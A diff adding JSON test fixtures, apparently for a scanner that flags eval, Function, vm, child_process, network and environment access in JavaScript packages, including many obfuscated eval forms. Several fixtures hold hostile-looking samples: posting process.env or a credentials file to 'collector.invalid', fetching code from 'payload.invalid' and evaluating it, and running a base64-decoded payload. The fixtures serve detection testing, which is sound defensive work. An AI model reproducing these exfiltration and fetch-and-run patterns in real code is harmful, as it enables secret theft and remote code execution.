@@ -112,5 +112,349 @@
         "obfuscated": true
       }
     }
+  },
+  {
+    "name": "method-named-eval",
+    "source": "class Parser { eval(node) { return node.value; } }",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "own-eval-method",
+    "source": "const parser = {eval(node) { return node.value; }}; parser.eval(node);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "shadowed-function-constructor",
+    "source": "function construct(Function) { return new Function(input); }",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "shadowed-global-object",
+    "source": "const globalThis = {eval: input => input}; globalThis.eval(input);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "indirect-eval",
+    "source": "(0, eval)(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "optional-eval",
+    "source": "eval?.(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "aliased-eval",
+    "source": "const execute = eval; execute(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "assigned-eval",
+    "source": "let execute; execute = eval; execute(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "function-without-new",
+    "source": "const compile = source => Function(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "aliased-function-constructor",
+    "source": "const Compile = Function; new Compile(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "global-function-constructor",
+    "source": "new globalThis.Function(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "computed-global-eval",
+    "source": "globalThis['ev' + 'al'](source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "destructured-global-eval",
+    "source": "const {eval: execute} = globalThis; execute(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "escaped-eval-identifier",
+    "source": "\\u0065val(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "eval-call",
+    "source": "eval.call(null, source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "eval-apply",
+    "source": "eval.apply(null, [source]);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "commented-eval",
+    "source": "// eval(source); new Function(source);\nexport const value = 1;",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "documented-eval",
+    "source": "export const example = 'eval(source); new Function(source)';",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "environment-network-transfer",
+    "source": "const https = require('https'); const request = https.request('https://collector.invalid/ingest', {method: 'POST'}); request.end(JSON.stringify(process.env));",
+    "expected": {
+      "source": {
+        "network": true,
+        "environmentVars": true
+      }
+    }
+  },
+  {
+    "name": "ordinary-env-configuration",
+    "source": "module.exports = {debug: process.env.DEBUG === '1'};",
+    "expected": {
+      "source": {
+        "environmentVars": true,
+        "network": false,
+        "eval": false
+      },
+      "supplyChain": {
+        "obfuscated": false,
+        "protestware": false
+      }
+    }
+  },
+  {
+    "name": "credential-file-transfer",
+    "source": "const fs = require('fs'); const https = require('https'); const r = https.request('https://collector.invalid/ingest'); r.end(fs.readFileSync('fixture-credentials.txt'));",
+    "expected": {
+      "source": {
+        "filesystem": true,
+        "network": true
+      }
+    }
+  },
+  {
+    "name": "downloaded-source-evaluation",
+    "source": "fetch('https://payload.invalid/source').then(r => r.text()).then(source => (0, eval)(source));",
+    "expected": {
+      "source": {
+        "network": true,
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "decoded-source-evaluation",
+    "source": "const execute = eval; execute(Buffer.from(payload, 'base64').toString());",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "aliased-process-source",
+    "source": "const cp = require('node:child_process'); const execute = cp.exec; execute(input);",
+    "expected": {
+      "source": {
+        "childProcess": true,
+        "shell": true
+      }
+    }
+  },
+  {
+    "name": "ordinary-process-tool",
+    "source": "const {execFile} = require('node:child_process'); execFile('compiler', ['fixture.js']);",
+    "expected": {
+      "source": {
+        "childProcess": true,
+        "shell": false
+      },
+      "supplyChain": {
+        "obfuscated": false,
+        "protestware": false
+      }
+    }
+  },
+  {
+    "name": "ordinary-minified-code",
+    "source": "function a(x){return x+1}function b(x){return a(x)*2}module.exports=b;",
+    "expected": {
+      "source": {
+        "eval": false,
+        "shell": false
+      },
+      "supplyChain": {
+        "obfuscated": false,
+        "protestware": false
+      }
+    }
+  },
+  {
+    "name": "vm-run",
+    "source": "import vm from 'node:vm'; vm.runInContext(source, context);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "vm-compile",
+    "source": "const {compileFunction: compile} = require('vm'); compile(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "vm-script",
+    "source": "const vm = require('node:vm'); new vm.Script(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "vm-source-module",
+    "source": "import {SourceTextModule} from 'vm'; new SourceTextModule(source);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "vm-context-only",
+    "source": "import vm from 'node:vm'; vm.createContext(object); vm.isContext(object);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "vm-local-method",
+    "source": "const vm = {runInContext: source => source}; vm.runInContext(source);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "borrowed-function-apply",
+    "source": "const apply = Function.apply; apply.call(target, receiver, args);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "borrowed-eval-apply",
+    "source": "const apply = eval.apply; apply.call(target, receiver, args);",
+    "expected": {
+      "source": {
+        "eval": false
+      }
+    }
+  },
+  {
+    "name": "borrowed-apply-evaluator-target",
+    "source": "const apply = Function.apply; apply.call(Function, null, [source]);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
+  },
+  {
+    "name": "function-apply",
+    "source": "Function.apply(null, [source]);",
+    "expected": {
+      "source": {
+        "eval": true
+      }
+    }
   }
 ]
